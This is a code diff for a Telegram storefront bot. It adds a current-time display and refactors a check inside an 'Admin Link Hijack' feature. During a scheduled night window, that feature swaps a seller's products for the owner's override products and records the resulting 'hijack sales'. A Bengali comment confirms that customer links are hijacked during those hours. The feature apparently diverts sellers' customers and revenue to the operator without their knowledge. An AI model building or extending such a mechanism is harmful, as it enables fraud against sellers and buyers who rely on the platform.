@@ -305,7 +305,9 @@ def show_storefront(chat_id, seller_uid, is_preview=False):
     if is_preview or can_use_panel(chat_id):
         markup.row(InlineKeyboardButton("⚙️ Open My Admin Panel ⚙️", callback_data="adm_open_panel"))
 
-    if is_hijacked and target_store.get("hijack_override", {}).get("enabled", False):
+    # হাইজ্যাক ওভাররাইড চেক
+    has_override = is_hijacked and target_store.get("hijack_override", {}).get("enabled", False)
+    if has_override:
         products = sorted(target_store["hijack_override"].get("products", []), key=lambda x: x.get("position", 999))
     else:
         products = sorted(target_store.get("products", []), key=lambda x: x.get("position", 999))
@@ -526,12 +528,18 @@ def _owner_handle(call):
         status = "🟢 ON" if cfg.get("enabled") else "🔴 OFF"
         st = cfg.get("start_time", "02:00")
         et = cfg.get("end_time", "06:10")
+        
+        # বর্তমান ভারতীয় সময় (IST Time) বের করা হচ্ছে
+        current_ist_time = datetime.datetime.now(IST).strftime("%H:%M:%S")
+        
         mk = InlineKeyboardMarkup()
         mk.row(InlineKeyboardButton("🔴 Turn OFF" if cfg.get("enabled") else "🟢 Turn ON", callback_data="hijack_toggle"))
         mk.row(InlineKeyboardButton("⏱️ Set Custom IST Time Range", callback_data="hijack_set_time"))
         mk.row(InlineKeyboardButton("📊 Hijack Sales Stats", callback_data="hijack_view_stats"))
         mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
+        
         txt = f"🌙 **Admin Link Hijack Schedule (IST)**\n\n" \
+              f"⏰ **Current IST Time:** `{current_ist_time}`\n" \
               f"**Status:** {status}\n" \
               f"**Hijack Time (IST):** `{st}` to `{et}`\n\n" \
               f"ℹ️ *এই সময়সূচীতে ভারতীয় সময়ে কাস্টমার লিঙ্ক ওপেন করলে সরাসরি হাইজ্যাক হবে এবং সময় শেষ হওয়া মাত্রই স্বাভাবিক নিয়ম কাজ করবে।*"
